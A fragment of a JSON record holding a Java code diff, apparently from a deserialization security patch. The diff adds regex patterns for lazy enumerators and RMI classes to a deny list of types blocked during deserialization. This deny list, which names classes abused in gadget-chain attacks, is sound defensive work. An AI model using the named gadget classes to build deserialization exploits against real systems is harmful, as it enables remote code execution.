          "342:         \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\");",
          "343:     private static final Pattern JAVAX_CRYPTO = Pattern.compile(\"javax\\\\.crypto\\\\..*\");",
          "344:     private static final Pattern BCEL_CL = Pattern.compile(\".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\");",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "339:     private static final Pattern LAZY_ENUMERATORS = Pattern.compile(\".*\\\\.Lazy(?:Search)?Enumeration.*\");",
          "345:     private static final Pattern JAVA_RMI = Pattern.compile(\"(?:java|sun)\\\\.rmi\\\\..*\");",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "657:             \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", //",
          "658:             \"sun.swing.SwingLazyValue\"});",
          "659:         denyTypesByRegExp(new Pattern[]{",
          "662:         denyTypeHierarchy(InputStream.class);",
          "663:         denyTypeHierarchyDynamically(\"java.nio.channels.Channel\");",
          "664:         denyTypeHierarchyDynamically(\"javax.activation.DataSource\");",
          "",
          "[Removed Lines]",
          "660:             LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS,",
          "661:             JAVAFX_OBSERVABLE_LIST__, BCEL_CL});",
          "",
          "[Added Lines]",
          "662:             LAZY_ITERATORS, LAZY_ENUMERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVA_RMI, JAVAX_CRYPTO,",
          "663:             JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL});",
          "",
          "---------------"
        ]
      }
    }
  ]
}